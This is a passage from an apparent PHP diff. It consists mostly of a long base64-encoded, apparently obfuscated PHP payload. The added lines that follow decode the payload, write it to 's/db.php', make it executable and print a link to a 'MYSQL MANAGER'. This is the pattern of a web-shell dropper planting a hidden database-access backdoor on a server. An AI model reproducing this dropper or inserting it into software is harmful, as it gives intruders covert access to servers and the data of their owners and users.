dnNTJhLytYMjgwdGx3UkhOWnljYnA5K2tENTY0c0NRNVl0TUVFbDBvM3VwTjhTVGJuVmNVdWFKbHN0U1JlbDl5V052b2JRU2E1STB1KzJISERrdnI5Rm1tbVNsVEoxalNGckFPU1M0MndHTmNiUU1kY0JkRmlMTGg3VTFxNnRzT2xKQ0xnTzdCeFplblczTkRoMmwrT1hkbzNuSDd2RUFKK2VEdldGM09IMjBrL1J2WU9ITmduTWd6cUVHV21tVmtkRjBKVUhycGxHb1ZGaTZwRENLcmxGMmptZkIrTExyNkFzVUpFR3BJVnFMelRpUmNKZklaK0l3RjcxSVppQUxaVzloYmFRK1hmNHZsTEVLblNzakVTWVB2NHdWTWVudGh1ZWdWeFR4UjdPWmw5MnRiMWM2ck5UYXNjUGdUQ1R0djVONW1CdHRheDcwTXRIeVpueDVJdkRTR3VpWm9NVHJtWHRBTng2eDdTVmpmYy9ERklNbGUySms4aDkyYW1Uait4NG5SM2w4dWRPakU1WDhOcXhseDBobExyeU1aQ3gzTHBaSndqc2hyZVgwQlVocmNXVWhWeTB3VTVXWDJwZGFvaFplRnU2MjZKek1MQ05saFdld3JuQ0Rua2FwTjVOaDRtM3RwY1A5NFk2VzBjWlVYcTczaDJLeDhRZTREYzBkOFVvOGhXMS9rNXdHZDdwZ1NjRldYZXc3RG5mUzZXZDlEVmhnSTM4SnlKOUxNRXVhOXgwVDhtOWRJV2oxSFhYOVFLMTZ1azBnVGdBYVJScmQwYzc0TXZvT3BjekZCQXdVdDFBNkRSbVozaWgvSDhJeDcwTVk0dWdMZ2hUeUVWTFBtOXlJSE4xUmFpcXdHOFc2a2hGZGhiRm5YM2JadmFiYlFXelFZK2dWaldRLzYxeHh5bUpjNnBuN0VvV0lGeHdYNldxaDZ0UFlzaSsxcm1ZcGpxOExzZk0vL0NDaitFcXVlb0VhR0UxdStJWWRYL3EyNDZoMDhCb29vd21IZ3RIZE5YZHJFbnhTM3JpUzY3dnl3blB1WnFvNkJteXBxNmQ4MzVOdVo5Sm0wZWE5b25ndDFTSHpnZSt1UTBNNnVoa2IwQTVsV3Bpb3QzRVVYUVkraGJUWEJic0E0ZmNzbUpJS2l1NE9rSm5CTlRwWXFFL25zMmdFeTdSQ0dnNjZRZFNUQm5YOU1rdUhJLzA1Um9ocnY1SVZ6bHltQjluMG1JdnIxdlF0QUVtVGY3K1N2OXU1aXBqSmlpZnNzL0tTbWZVaURQMGVIaDBlbjZJVzJoVlBuejZ4d21kQTJwZDNWM2RpamFqVzg2MzFVRkxuY3lmUjNBTWxEL05sV3dweGpPeENrbTRqUDVhZW8vRXlMdmlRK1BFU3kvMUVSaXZHWDZHZDBOUFZHVkFGVVpHSkVFMm45RFNQZUtiaXE4aVhPUGFER2RmZU1MV3RtQzVDaXNDTWt0NlpZQzlhSmNYM0hMZ3c5OXdEQTZrZWlIVWhxWnRhcW1oTlZMSWdHQ2tteVJPYUxUbWhDdlZhV0FkQk90bG1RYzBxQXN2U0dtQmdFbzhmaTlLQ3hNWnZZaW5Wa1JuVktXV0MzVC9tSjFvK1VaRTFYOXNrUlllUlN5cllkVnRPWmFaRHRjaHphSHVMenN3Wmkrd0podnAvUmJBTS9teWhrdk11aUJQV3cxeTVQZzFwSlBqMTZOMkczWWtXYkxOSTd5ajJQOW5rdEZzTitVT3pRTUQzVnBjR1FGVFUxVzZMT2VpaUNYQ3hhK3dnUElLR3l4aS91ckdJQWh0NHhwOERibVFuUHpRTmUyelVLSDhuTHExcExoMkEzS2VnTUQwbWVHUE1vaWErdnArRWc4bnNlNGxOSnU4U3R4TFl3VVh2Q0t1U3JxWkxaRkFqSVdCbXlZdnhCaVFuSldjUjZKK1lYNldSZlhYWFd5ZXNkc2gzUlhETC9LY2ZUN3pRNjd6WmZ2djdyOGVISHc1MjJ1TG5kL1JQUjc5NThoSjJ6dkozUmZCcGtlekxCSm5EVnJMenRTT0FicTluYnE0WG1nSHpHVFFpdkU3ZkZzcTlhbHZ1QzFtcURIYVRKZ1hMMmVSYjgyVTNwQmtCNlVIYTNpUFdGV3JrNG43Mk5SQWZQMm1sUlQxb3M3SGhoeE43R0RMNmpIL3RqNWNwM29tYytqcDZ3R3hRd2hTQU5GUzE5TE9GV050bFQ5UnIvQ2JvT3FKUVIraUE2bitnVTFVNkIxRUZXa1lYRUNZWC9tdzJ0TkJLSEs5TkFiZm9iaXczU2VyUFZjTXlMMCsrNWpLTlJPRUhJSG82a2QvdlljOGhaZ0x2cEMvM2JwSTQxT2xGdkN3bnFrcS9sZXpySUJsQ3pXZ1pqL0dhS21KWThFMWQ1THNUTzdWYVlSRFpuL2pvOWRTUGNITzJBQnA0MFRmR1FQZkt0TjVxYnFvenpkY0xkUS9XYU5acW1jZXNORmd6Q1BDajQzMFJLK1VsdmFDSFBYbGVPVlNNZWlicDdCSU4zeXhHU1U2LzIxaXVyNlZwekdOc0w5OHRReW5CZm55OG5kdFY5NU81RkM4b005ZW5zRXdTaEtpL3pnVjJFQUxpYnZhUzcyMmU2TVFmTGM4NUd0eFdpUFZicFBkK3ZUUkZnMWNDZ3A0Mjh1TWhMbEF2QmFXaTdERlQzUG8xbFZvZGpFbXQzQi9GRVY2SjgzV0FpMElOMjJBQ0hRd24xYVRtbXFmdFRHZnVkWFd2aTFlWjFTdFYrTTB4ODExKzNrRmZqZ0hsT2J3MFowVXlOcitxdzkzYkZKZUpOWXV4K1RVNyt1Y3R5Tmd3b2tmUUVBTmVqK1o0ZTQ3Rk43NTQ4MkFmamp1UjUvY25yR3REQXFiMmloaGZzblRDeXd4dGZVMWJSWXZUZlcwNnlTNmpteU85NHRxQWl1VlhyQXBDNmFxM1RyNzFhd1Q2R0JndklhcmJoK3JXb1Z5L0ZISjBTaStId2ZZRWRCSVdFaUdiMUYxenZ5RUx3a2QyeWNyeThTekExOGxHUWVqRk54MUhNYWl3eWpHM1pEcXBoMVVmVitpM2RmZGVIVTF3dnYzQ3E1Q1o3S2ZseThyeWVCK3p6eXFYQS92SjFrODFXNDBYRWp2d0VkOFp0dEZMckhUeUhpejBtUjFEWkZVVHlpdnBqbjFRSnlVd28xYXY4NVhGS1NuQVRnYk9QdjZYUi80Yys0TTh2a2NWZ2VmMURydWwrT2M5Sy9iVGZNVTdrQ2lHeUt5Q3dFVkhseTMwUnVkalcyWkRjbTN0YjV2ZGJwT3VIT09UUDZRSjRpdGtaZElIMXNrUmlQZHFoUlZXZWt4Q1ZNTG9pcDVOMERFdE1vUENRQm95OUVQbkNhdXkxTTVOMllxbm5qV0p6bXJvalkweWFJcFdrU0VxTXJzdTFzR1N4VmVrTm9wdGs1LzRrblIyeXNtQ2NxWjhXREJiYkU3UVJrZ25nWHBUS1hhRnpoVGwrUmpEYXg4dyt4RTJDWmM4TFdPSU15eGFidzNxbWZTbWVpYTFzbHpJemdSem02NUVMM3Rtb0ZZeGtRSHNTY1k1NVJ6QTU1NHFuN3pZT0VkMDBJajlnTFVHVWIxVVVGM1J0Ri9sY2c4aU54c3Rhd0JiR2NBLy9DUjdpOXpTYTZDQ3BSQmtHd3pmb0RFc3d3UFZZTFVvcGg0aWVnU0U4aXFoQnFmRmdvUnhyY2lXTWdXTEJzWmVxWWdtME5qSnZ3ZHBzTGRHY2M4MUdtT0Z0aXJMZy9SSXFaSzhONUZEbEZIWjdXeDJMSkZheldpUnFKUGJvSzB5L214bXBuZXpJRGsrbXRaTG1HSjdDcFhJZ1h1RGFwMDg1STU5WDI1aFZGQ29ZQjBQMDhtdzNHNHBnZTZMNW9zbkw1NjJYbTdLTngza29USTVaQ1hRaGdVa2ZvRUV6Q1BNYTRvR1dObS9qdXhwWk9GOSt2TFppK2QzSWlXSUlzYjNxekIrb1kxbHJmdDlsSHUvVngzNzAyK0VlSE9UeXZsdEpqWVdLa2FTUTE4Yy9YYjBuOEZDUHFCWHdkTk1EcUZSWE9aeVVLS0N1UGFERk5LdkN3YlArWi9qYUw2STZhVUdBa08vQmxUaEpUeSttdWhRY0tNZElNYWFvUGR2OE9veGhTd0VNU3BjMENYMTRDeVdkT2tzVmF6M3hLOSsrZzR5OXlHVDYzYzJOdGJXMThUNitzK1BmMjYxbWkwNytFY2pKbDJqMjBOTlEyZWVEYnBLdEgrcXEvZGdFZU5heTRyeHF6N3k1NHRVdGZYeDQrcWpYUE1oSy9NNk0yWFdRTStDRDlsQzdvL0tZcllvWnNqcHF4cFY2elZybjFmMVFEK3ZiZFFzZXByWkZGQnMxcFFmTXdTRFNKZ2lrTXV4bTFNYzJOaERvRW1kRHBod2J0allPdW9KSklLNWMvd0tiNUpuM2dKWG8rZE5KdStveGJJUmRaR0J1eldSM09zOW1JZ1VHaUtyVWs4UnFNREcyNnlva3R4ZUtab0tNd2lmZzBxOU5CaURabWk2cUlmUHVwbUVHeDd5TlZ1bUxrelFFUjBzWFI4UGN4RGdvcVlsRXBZOTZvSTZRd2FMU2pWY0hyQXVJaE80dHphNHNDTWZ2ZU5Xb0kwdW1aSnBQSm5qRlE4bWNtV3F1VWZqcGVnWEZIblAzbXhvdmVPNUtkaU1ndjZ4NDQ2b2RBenJBaHRSWG9xdldtdUlybkQ2MTgrYS9ldW5vLzUxOHhuOC94eitiOXIvTzZwaU5Kc01wVnRieU5nbmE0U1dZWEM5dVJNbHAyZzhWekFsemVhbWRQRkRTbW43ZGprQnZFSnhnNmZqb0xxMjliZUdNdGZTRkpJejl3WSszQUVlVWZ6OVpaNkVMcVdHSWtBbld6ekhRM0xKbmxhK2JPTGQ2S3E1c2d2WWJoTXFWTEZmVnIwZ1hLTGtIcFNVc1gxdnltN0Z4b1pBajE0d05WcElXZmZXWmZlMnRzVG1zNXI0SzhzRDdnYVd0WXBsM0Ewb2JNR205OWRQUDFiTE9vTEZKWFYxVjZDOFNOYjBwdGNUcmVJT3J3VUdUbE5VZjltTXo4NEhLWHRXYXY5S0NrMWt0UW1vVS81MVZTNnA3R3lqT2NKMzlQMXJxdkFEL3RHV2F4YzJWRVp3OW54Z3ZsOE1mdnF4a1N0L2FwVS9LeW5mdE1xZmxKUTNyZklXUFVXT3J6UzR1a0c0MGdoY1p3QUdweU9EbWVNZnNndnhDZnovMUpGRkRTcHJQVldMMGVTWkJXcmx2Y3psYVlwOFdSb0dhY2d4eW5yN2hGSGlUU2JHUHo0RFA1OXNXcmwveWtmOWpLNWdWOG5oK3JOUVRXN1hhdGYraytkRXM1NnJBalA5YWEwT3RnODNITjJhQzI5OFdYWC9pYk1CMnJTaUFPbVhGOG1PRmdvL3VZYTIzakVMRUUwcnQ2TGViWkZKYXZIL1JUdXRUVmRLZUk2MG5NWmtPZnBYUTMyUUxIdWc3VDI2QWt4TFE5YXNxZmRGSnJFL3pzbjVGdnkvU1ZPRVN3dXp5YzYySnQ0OW9LM3BwN1B0R1doeVM5aFdXcVk1VjFacUQzS3V2RERPWWhWVTgvK2hCRnY3WkhObGtSNTNhNVBOS0dGV1BrNUlQUld5akZZVFZkVlMrenhQSTRJckduQ2tvK2s0Wk43NEN2UEttcFBjQjhETUNrUXBxQ0pzK3hMNFQ3NElYYlZod0RNNlNjTWVRRkJ1OGNTamdMZDJiN0FmREpmVmRKQXRzSkRZcFNTUHNDZ3p5MHRjQ3RuM1NPa1h2VVhhVmZvSUJiY3U2Y1pCK2Q5WWtUSFUvUHlzQlk5cktmUFhWbVFrZVZWQ1RqRUNnQzZYZEZ2Nk5reGlSYlRMUDVKaTNYUjE3R3ZDQkY4ZWw4Nm9hdGJMdG9aWXZsdll6THA2c3RmNmd5TzZjVTExelROVEJXWVlrem1qeTVBRGxjS3JsUU5IdmZva1RUZ3VjdVFWYlVmOUVhRWN4cDNkZDlzZjlrK0ZLK0VsK01CMXJDdG5YQ1N2anFNMzBQa0QzK1FwdzZmK2drMUpkWGtGbk9xWFY1YVFCRGd3Y3djOUpaSzdNdnpLSHJIZmQvOVlQVjRjcWxVeVdvaEVjdVNTVG9Fd2g2NjlEL2tQcWlqTitWSzlvKzhjSGUrOTN6Nyt3eUdqaHFBUG9uQUlDdFhIcGM4UldVMGJvZlBoWU84ZkgzYi80cVRtaDIxU0IvaFd6eGtEcVBISjVHV01rTnQ4S1FzbmFzbmJhTGFjaDZicGttdlVTOXJPK0J4MFJwYlVwWG9taWlvbE5icWRLWjlYQmZTMU8yWXIxc0hhU1ZkSkw0V2w3dFFkOHl5N1pGdlhZbHZwaUFzaGkzRVlSVldqcjJXWGh1Mlo1dFkzNjgvcDZxVGtzbU56UGd2NW9yWnFMU0ZKMmRBOFpmV1VaclpPSC9iTGZzaWNzQitFbmw3RlFVcUhxblZUSTNzUmxuMmF1bEQvbVRoNUUyWEZMWHRIZWI2MW5DcTVzZ2NZN3ZlU0FRS1dDTmppUzhEeTdkK3F3NW9RVVNMWGpSOTMxMXNsY2xUU1hsdkx3RzZabHQ5SEtqYTZlSmp6SlpFbzBjZ24wdkJtZUlabXVaalRFc2xnemdLNGpyclZtNHk5aGErUDNFcnd5d3R4dDJXVHF0YjVmcE5ETG1FMXZDdFE0bkZiQ1RKSFA4eWUxVm1XVUFzZk56YWU2aVh1M1J3bGdBVUZMV2VoSzBpM2ZCbzNIT3ZaZHcyWWp1alZRQk9IZi8rL0hQRjB4WFdsMnd4NmpteituTGwxN2hZYnJPT3EyWHptT05pdTY5Ymt0WEdPSnFMWDdpdnkrZno4VS9neXVydVNmMitmUGlpVzJ5bW55eSt6VnJ6NDNFanVHaC9YbnAveEs2OGtzKzFrRHhUZlY4S1JRZWhVaE4rRHZ1UGdoWGFaRHd5RWpJNUM1Y3U5Vk9GUzZWZTVkRnY5QVF2S3BXZGdCN1IvMldrdytURkF4TlhZK1NrN2cxMmxYMlhUZER5REx6d29NbHpLYjh1YTJpcjlLcGR1NHhNTHdDOGRhMFdsNnIyNmdYWFBuMHFJNkNBWG5FOGxsQmhZNDRhWnRFT3FQMnVReWRIRGlabVVHSmc1d0tSUW40SThNeGo4U1Z3ZFVDaS9mRHZBZnFIQitiZHJwbE1hNDJNOVhWaWNxV1lnOU1PRDh2RVNsY2Jwb3I3cFZsWU91dUU2S3BMMElaTkp6YUhTbVpCNWo5RG1zOWhTZjFJd2QwdWt5TTh5cnV0TzlaeWl2NS83eFM4MERvcFJIVmFoZGVrNjk0ZDdlYUdyWngwSFhWSXo5Y3ptK21ha29ReXZvMGh3aVd4cmc4RktKbHc1Z3ZKNjZqKzZSOElrVEtkTEdhN2VUYk9sc0g0Y05qZHorSS9zRUJhT0w3WEZqTTZCbWJQUWYyMkhpdVM5VWd0WTUrRFJuaitiR3FGRWZ5ekNua2dxQTZTbi9Fc1NhbUZRU2twUVd3Q3lmbXlJeVRTMEN6dldjdVU5RzRxVHZkOHFsZkd6TXBkVG1DK2piR1UrcC9SYWxlM0w4MSt1QkR0Z1N5MHZMWEZMSG9VcVc5OG96MHRXdDJRRDN1S3kyU0RUZU9taWFaZ1YwMjAvQXlYVFhiSDU3SnQzaXFKY3p6MEcxS2ZYZ082OWtMRUhXczdDTitaaGUxVWVmbXYyczN6c1dZSTE4eXpRb214M1YzZXhNSlpOdjhqUExOVi9Qa0RseTFmV3pTdVJoVWQ1MkVDRXdlV1FkZGxMbmU2dmVPWHdoSlBtU2NQY0M0VGxUVFk2MHlySUJYVEtzMjkxTFdLZndpNFdvQVduUXlxMTdscXBVa0x5dnk1QjhBdz0iKSkpOyA/Pg==";
+$write = fwrite($f2, base64_decode($sml_db));
+if ($write) {
+@chmod('s/db.php', 0755);
+}
+echo "</br></br><center><b>GO TO : <a href='s/db.php' target='_blank'>[+] MYSQL MANAGER [+]</a></center></br>";
+}
+}
+?>
